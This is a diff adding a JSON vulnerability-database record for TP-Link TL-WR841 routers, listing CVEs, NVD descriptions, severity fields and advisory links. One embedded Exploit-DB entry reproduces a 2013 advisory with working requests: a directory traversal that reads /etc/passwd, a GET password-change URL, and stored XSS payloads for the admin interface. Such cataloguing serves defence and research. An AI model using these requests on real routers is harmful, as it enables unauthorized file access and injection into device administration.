@@ -1,0 +1,506 @@
+{
+    "ves": {
+        "ves:product": {
+            "product": "TP-link router",
+            "manufacturer": "TP-link",
+            "models": {
+                "tp-link_tl-wr841": {
+                    "vulnerability": [
+                        "CVE-2022-42433"
+                    ]
+                },
+                "tp-link_tl-wr841n": {
+                    "vulnerability": [
+                        "CVE-2022-42433",
+                        "CVE-2022-46912",
+                        "CVE-2019-17147",
+                        "CVE-2012-6316",
+                        "CVE-2012-6276",
+                        "CVE-2012-5687",
+                        "CVE-2020-35576"
+                    ],
+                    "exploit": [
+                        "24504"
+                    ]
+                },
+                "tp-link_tl-wr841nd": {
+                    "vulnerability": [
+                        "CVE-2022-46912"
+                    ]
+                }
+            }
+        },
+        "ves:vulnerability": {
+            "CVE-2022-42433": {
+                "basic-info": {
+                    "description": [
+                        "This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link TL-WR841N TL-WR841N(US)_V14_220121 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the ated_tp service. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-17356."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "29-Mar-2023",
+                        "nvd-last-modified": "05-Apr-2023"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 2.1 ",
+                    "cwe-id": "CWE-78",
+                    "cwe": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/78.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2022-42433",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (excluding) 220914 "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Adjacent Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "Low",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            },
+            "CVE-2022-46912": {
+                "basic-info": {
+                    "description": [
+                        "An issue in the firmware update process of TP-Link TL-WR841N / TL-WA841ND V7 3.13.9 and earlier allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via uploading a crafted firmware image."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "20-Dec-2022",
+                        "nvd-last-modified": "28-Dec-2022"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 2.8 ",
+                    "cwe-id": "NA",
+                    "cwe": "Insufficient Information",
+                    "cwe-link": [],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2022-46912",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 3.13.9 "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-3": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841nd_v7_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 3.13.9 "
+                        },
+                        "CPE-4": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841nd_v7:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "None",
+                        "user-interaction": "Required",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            },
+            "CVE-2019-17147": {
+                "basic-info": {
+                    "description": [
+                        "This vulnerability allows remote attackers to execute arbitrary code on affected installations of TP-LINK TL-WR841N routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the web service, which listens on TCP port 80 by default. When parsing the Host request header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length static buffer. An attacker can leverage this vulnerability to execute code in the context of the admin user. Was ZDI-CAN-8457."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "07-Jan-2020",
+                        "nvd-last-modified": "14-Jan-2020"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 2.8 ",
+                    "cwe-id": "CWE-120",
+                    "cwe": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/120.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2019-17147",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:0.9.1_4.16:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "None",
+                        "user-interaction": "Required",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            },
+            "CVE-2012-6316": {
+                "basic-info": {
+                    "description": [
+                        "Multiple cross-site scripting (XSS) vulnerabilities in the TP-LINK TL-WR841N router with firmware 3.13.9 Build 120201 Rel.54965n and earlier allow remote administrators to inject arbitrary web script or HTML via the (1) username or (2) pwd parameter to userRpm/NoipDdnsRpm.htm."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "30-Sep-2014",
+                        "nvd-last-modified": "01-Oct-2014"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-79",
+                    "cwe": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/79.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2012-6316",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 3.13.9 "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2012-6276": {
+                "basic-info": {
+                    "description": [
+                        "Directory traversal vulnerability in the web-based management interface on the TP-LINK TL-WR841N router with firmware 3.13.9 build 120201 Rel.54965n and earlier allows remote attackers to read arbitrary files via the URL parameter."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "26-Jan-2013",
+                        "nvd-last-modified": "28-Jan-2013"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-22",
+                    "cwe": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/22.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2012-6276",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:3.13.9:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2012-5687": {
+                "basic-info": {
+                    "description": [
+                        "Directory traversal vulnerability in the web-based management feature on the TP-LINK TL-WR841N router with firmware 3.13.9 build 120201 Rel.54965n and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the PATH_INFO to the help/ URI."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "01-Nov-2012",
+                        "nvd-last-modified": "28-Aug-2017"
+                    },
+                    "impact-score": "",
+                    "exploitability-score": "",
+                    "cwe-id": "CWE-22",
+                    "cwe": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/22.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2012-5687",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (including) 3.13.9 "
+                        }
+                    }
+                },
+                "evaluation": {}
+            },
+            "CVE-2020-35576": {
+                "basic-info": {
+                    "description": [
+                        "A Command Injection issue in the traceroute feature on TP-Link TL-WR841N V13 (JP) with firmware versions prior to 201216 allows authenticated users to execute arbitrary code as root via shell metacharacters, a different vulnerability than CVE-2018-12577."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "26-Jan-2021",
+                        "nvd-last-modified": "02-Feb-2023"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 2.8 ",
+                    "cwe-id": "CWE-78",
+                    "cwe": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/78.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2020-35576",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:tp-link:tl-wr841n_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (excluding) 201216 "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:tp-link:tl-wr841n:v13:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "Low",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            }
+        },
+        "ves:exploit": {
+            "24504": {
+                "exploit-title": "TP-Link TL-WA701N / TL-WA701ND - Multiple Vulnerabilities",
+                "platform": "Hardware",
+                "exploit-timestamps": {
+                    "created": "NA",
+                    "edb-published": "15-Feb-2013"
+                },
+                "cve": [
+                    "CVE-2012-6276"
+                ],
+                "content": [
+                    "\\'Device Name: TL-WA701N / TL-WA701ND\\\\r\\\nVendor: TP-Link\\\\r\\\n\\\\r\\\n============ Vulnerable Firmware Releases: ============\\\\r\\\n\\\\r\\\nFirmware Version: 3.12.6 Build 110210 Rel.37112n\\\\r\\\nFirmware Version: 3.12.16 Build 120228 Rel.37317n - Published Date 2/28/2012\\\\r\\\nHardware Version: WA701N v1 00000000\\\\r\\\nModel No.: TL-WA701N / TL-WA701ND\\\\r\\\n\\\\r\\\nFirmware download: http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1\\\\r\\\n\\\\r\\\n============ Vulnerability Overview: ============\\\\r\\\n\\\\r\\\n    * Directory Traversal: \\\\r\\\n\\\\r\\\nAccess local files of the device. For example you could read /etc/passwd and /etc/shadow.\\\\r\\\n\\\\r\\\nRequest:\\\\r\\\nGET /help/../../etc/passwd HTTP/1.1\\\\r\\\nHost: 192.168.178.2\\\\r\\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1\\\\r\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\\\r\\\nAccept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\\\\r\\\nAccept-Encoding: gzip, deflate\\\\r\\\nProxy-Connection: keep-alive\\\\r\\\nReferer: http://192.168.178.2/help/\\\\r\\\n\\\\r\\\n==>> no authentication needed!!!\\\\r\\\n\\\\r\\\nResponse:\\\\r\\\nHTTP/1.1 200 OK\\\\r\\\nServer: TP-LINK Router\\\\r\\\nConnection: close\\\\r\\\nWWW-Authenticate: Basic realm=\"TP-LINK Wireless Lite N Access Point WA701N\"\\\\r\\\nContent-Type: text/html\\\\r\\\n\\\\r\\\n<META http-equiv=Content-Type content=\"text/html; charset=iso-8859-1\">\\\\r\\\n<HTML>\\\\r\\\n<HEAD><TITLE>TL-WA701N</TITLE>\\\\r\\\n<META http-equiv=Pragma content=no-cache>\\\\r\\\n<META http-equiv=Expires content=\"wed, 26 Feb 1997 08:21:57 GMT\">\\\\r\\\n<LINK href=\"/dynaform/css_help.css\" rel=stylesheet type=\"text/css\">\\\\r\\\n<SCRIPT language=\"javascript\" type=\"text/javascript\"><!--\\\\r\\\nif(window.parent == window){window.location.href=\"http://192.168.178.2\";}\\\\r\\\nfunction Click(){ return false;}\\\\r\\\ndocument.oncontextmenu=Click;\\\\r\\\nfunction doPrev(){history.go(-1);}\\\\r\\\n//--></SCRIPT>\\\\r\\\nroot:x:0:0:root:/root:/bin/sh\\\\r\\\nAdmin:x:0:0:root:/root:/bin/sh\\\\r\\\nbin:x:1:1:bin:/bin:/bin/sh\\\\r\\\ndaemon:x:2:2:daemon:/usr/sbin:/bin/sh\\\\r\\\nadm:x:3:4:adm:/adm:/bin/sh\\\\r\\\nlp:x:4:7:lp:/var/spool/lpd:/bin/sh\\\\r\\\nsync:x:5:0:sync:/bin:/bin/sync\\\\r\\\nshutdown:x:6:11:shutdown:/sbin:/sbin/shutdown\\\\r\\\nhalt:x:7:0:halt:/sbin:/sbin/halt\\\\r\\\nuucp:x:10:14:uucp:/var/spool/uucp:/bin/sh\\\\r\\\noperator:x:11:0:Operator:/var:/bin/sh\\\\r\\\nnobody:x:65534:65534:nobody:/home:/bin/sh\\\\r\\\nap71:x:500:0:Linux User,,,:/root:/bin/sh\\\\r\\\n\\\\r\\\nScreenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/TP-Link-directory-traversal.png\\\\r\\\n\\\\r\\\nThis traversal vulnerability was already reported on some other TP-Link devices: https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-tplink-dir-traversal.nse\\\\r\\\n\\\\r\\\n    * The request for changing the password is a HTTP GET and the username and password are parameters of this HTTP GET: \\\\r\\\n\\\\r\\\nhttp://192.168.178.2/userRpm/ChangeLoginPwdRpm.htm?oldname=admin&oldpassword=XXXX&newname=admin&newpassword=XXXX&newpassword2=XXXX&Save=Save\\\\r\\\n\\\\r\\\n    * Stored XSS: \\\\r\\\n\\\\r\\\nInjecting scripts into the parameter Desc reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.\\\\r\\\n\\\\r\\\n-> Wireless MAC Filtering -> Add or Modify -> put your XSS in the description (parameter Desc)\\\\r\\\n\\\\r\\\nExample Request:\\\\r\\\nhttp://192.168.178.2/userRpm/WlanMacFilterRpm.htm?Mac=00-11-22-33-44-55&Desc=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%281)>&Type=1&entryEnabled=1&Changed=0&SelIndex=0&Page=1&vapIdx=1&Save=Save\\\\r\\\n\\\\r\\\nThis XSS vulnerability was already documented on a other device and firmware version: http://www.exploit-db.com/exploits/19774/\\\\r\\\n\\\\r\\\n    * Stored XSS: \\\\r\\\n\\\\r\\\n-> System Tools -> SNMP:\\\\r\\\n\\\\r\\\nInjecting scripts into the parameter sys_name and sys_location reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.\\\\r\\\n\\\\r\\\nhttp://192.168.178.2/userRpm/SnmpRpm.htm?snmp_agent=0&sys_contact=123&sys_name=</script>&sys_location=<script>alert(\\\\\\'XSSed\\\\\\')</script>&get_community=111&get_source=123&set_community=123&set_source=111&Save=Save\\\\r\\\n\\\\r\\\n============ Solution ============\\\\r\\\n\\\\r\\\nNo known solution available.\\\\r\\\n\\\\r\\\n============ Credits ============\\\\r\\\n\\\\r\\\nThe vulnerability was discovered by Michael Messner\\\\r\\\nMail: devnull#at#s3cur1ty#dot#de\\\\r\\\nWeb: http://www.s3cur1ty.de\\\\r\\\nAdvisory URL: http://www.s3cur1ty.de/m1adv2013-011\\\\r\\\nTwitter: @s3cur1ty_de\\\\r\\\n\\\\r\\\nThe traversal vulnerability was already reported on some other TP-Link devices: https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-tplink-dir-traversal.nse\\\\r\\\n\\\\r\\\nThe stored XSS vulnerability in the Desc parameter was already documented on a other device and firmware version: http://www.exploit-db.com/exploits/19774/\\\\r\\\n\\\\r\\\n============ Time Line: ============\\\\r\\\n\\\\r\\\nAugust 2012 - discovered vulnerability\\\\r\\\n06.08.2012 - reported vulnerability to TP-Link\\\\r\\\n14.02.2013 - public release\\\\r\\\n\\\\r\\\n===================== Advisory end =====================\\"
+                ]
+            }
+        },
+        "ves:solution": {
+            "CVE-2022-42433": {
+                "solution-1": {
+                    "url": "https://www.zerodayinitiative.com/advisories/ZDI-22-1466/",
+                    "type": "Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "19-Jul-2022",
+                        "last-updated": "NA",
+                        "nvd-indexed": "05-Apr-2023",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2022-46912": {
+                "solution-1": {
+                    "url": "https://hackmd.io/@slASVrz_SrW7NQCsunofeA/Sk6sfbTPi",
+                    "type": "Exploit, Third Party Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "28-Dec-2022",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "https://www.tp-link.com/us/press/security-advisory/",
+                    "type": "Vendor Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "28-Dec-2022",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2019-17147": {
+                "solution-1": {
+                    "url": "https://www.tp-link.com/us/support/download/tl-wr841n/#Firmware",
+                    "type": "Product",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "07-Jan-2020",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "https://www.zerodayinitiative.com/advisories/ZDI-19-992/",
+                    "type": "Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "04-Jul-2019",
+                        "last-updated": "NA",
+                        "nvd-indexed": "07-Jan-2020",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2012-6316": {
+                "solution-1": {
+                    "url": "http://seclists.org/fulldisclosure/2012/Dec/93",
+                    "type": "NA",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "17-Nov-2012",
+                        "last-updated": "NA",
+                        "nvd-indexed": "01-Oct-2014",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "http://www.securityfocus.com/bid/56602",
+                    "type": "NA",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "01-Oct-2014",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2012-6276": {
+                "solution-1": {
+                    "url": "http://www.kb.cert.org/vuls/id/185100",
+                    "type": "US Government Resource",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "11-Jan-2013",
+                        "last-updated": "NA",
+                        "nvd-indexed": "28-Jan-2013",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2012-5687": {
+                "solution-1": {
+                    "url": "http://archives.neohapsis.com/archives/bugtraq/2012-10/0154.html",
+                    "type": "Exploit",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "01-Nov-2012",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "http://packetstormsecurity.org/files/117749/TP-LINK-TL-WR841N-Local-File-Inclusion.html",
+                    "type": "NA",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "29-Oct-2012",
+                        "last-updated": "NA",
+                        "nvd-indexed": "01-Nov-2012",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-3": {
+                    "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/79662",
+                    "type": "NA",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "01-Jan-2012",
+                        "last-updated": "NA",
+                        "nvd-indexed": "01-Nov-2012",
+                        "nvd-updated": "28-Aug-2017"
+                    }
+                }
+            },
+            "CVE-2020-35576": {
+                "solution-1": {
+                    "url": "https://jvn.jp/en/vu/JVNVU92444096/",
+                    "type": "Patch, Third Party Advisory",
+                    "isPatch:": "Yes",
+                    "solution-timestamps": {
+                        "created": "22-Jan-2021",
+                        "last-updated": "22-Jan-2021",
+                        "nvd-indexed": "NA",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "https://www.tp-link.com/jp/support/download/tl-wr841n/v13/#Firmware",
+                    "type": "Patch, Vendor Advisory",
+                    "isPatch:": "Yes",
+                    "solution-timestamps": {
+                        "created": "13-Jan-2021",
+                        "last-updated": "NA",
+                        "nvd-indexed": "NA",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-3": {
+                    "url": "https://www.tp-link.com/us/security",
+                    "type": "Vendor Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "03-Feb-2023",
+                        "last-updated": "NA",
+                        "nvd-indexed": "NA",
+                        "nvd-updated": "NA"
+                    }
+                }
+            }
+        }
+    }
+}
